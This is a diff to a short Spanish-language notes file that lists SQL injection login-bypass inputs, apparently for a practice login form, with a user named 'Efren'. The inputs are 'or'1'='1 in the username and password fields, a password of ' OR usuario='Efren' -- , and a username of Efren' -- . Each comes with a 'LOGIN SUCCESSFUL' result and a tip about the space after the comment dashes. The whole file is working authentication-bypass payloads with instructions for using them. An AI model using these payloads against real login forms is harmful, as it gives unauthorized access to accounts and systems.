@@ -2,14 +2,15 @@
 Ejecutar un login por defecto
 *************************************************************
 Usuario: 'or'1'='1
-Contraseña:     
+Contraseña: 'or'1'='1 
 RESULTADO-->LOGIN SUCCESSFUL!
 ##############################################################
 
 *************************************************************
 Poner Usuario y después como contraseña la siguiente sentencia
 *************************************************************
-' OR usuario='Efren' -- 
+Usuario: Efren
+Contraseña:' OR usuario='Efren' -- 
 Con espacio después de las dos línea
 ##############################################################
 
@@ -17,7 +18,8 @@ Con espacio después de las dos línea
 *************************************************************
 Poner la siguiente sentencia y después como contraseña lo que sea
 *************************************************************
-Efren' -- 
+Usuario:Efren' -- 
+Contraseña: Lo que sea
 Después de los guiones un espacio
 
 ##############################################################
